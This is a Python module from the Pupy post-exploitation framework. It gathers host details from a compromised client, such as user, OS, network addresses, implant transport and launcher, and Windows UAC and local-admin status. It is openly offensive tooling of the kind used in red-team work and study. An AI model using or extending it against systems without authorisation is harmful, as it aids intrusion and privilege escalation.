# -*- coding: utf-8 -*-
from pupylib.PupyModule import *

__class_name__="GetInfo"

@config(cat="gather")
class GetInfo(PupyModule):
    """ get some informations about one or multiple clients """
    dependencies = {
        'all': [ ],
        'windows': [ "pupwinutils.security" ],
        'android': [ "pupydroid.utils" ],
    }

    def init_argparse(self):
        self.arg_parser = PupyArgumentParser(
            prog='get_info',
            description=self.__doc__
        )

    def run(self, args):
        commonKeys = [
            "hostname", "user", "release", "version",
            "os_arch", "proc_arch", "pid", "exec_path",
            "address", "macaddr"
        ]
        pupyKeys = [ "transport", "launcher", "launcher_args" ]
        windKeys = [ "uac_lvl","intgty_lvl" ]
        linuxKeys = [ "daemonize" ]
        macKeys = []

        infos = []

        for k in commonKeys:
            infos.append((k,self.client.desc[k]))

        if self.client.is_windows():
            self.client.load_package("psutil")
            self.client.load_package("pupwinutils.security")
            for k in windKeys:
                infos.append((k,self.client.desc[k]))

            security = self.client.conn.modules["pupwinutils.security"]
            currentUserIsLocalAdmin = security.can_get_admin_access()

            value = '?'
            if currentUserIsLocalAdmin == True:
                value = 'Yes'
            elif currentUserIsLocalAdmin == False:
                value = 'No'

            infos.append(('local_adm', value))

        elif self.client.is_linux():
            for k in linuxKeys:
                infos.append((k,self.client.desc[k]))

        elif self.client.is_darwin():
            for k in macKeys:
                infos.append((k,self.client.desc[k]))
        elif self.client.is_android():
            battery=self.client.conn.modules["pupydroid.utils"].getBatteryStats()
            build=self.client.conn.modules["pupydroid.utils"].getInfoBuild()
            infos.append(("battery", battery))
            infos.append(("build", build))

        for k in pupyKeys:
            infos.append((k,self.client.desc[k]))

        infos.append(('platform', '{}/{}'.format(
            self.client.platform, self.client.arch or '?'
        )))

        info_fmt = '{{:<{}}}: {{}}'.format(max([len(pair[0]) for pair in infos]) + 1)

        infos = [
            info_fmt.format(info[0], info[1]) for info in infos
        ]

        max_data_size = max([len(info) for info in infos])
        delim = '-'*max_data_size

        infos = '\n'.join([delim] + infos + [delim, ''])

        self.rawlog(infos)
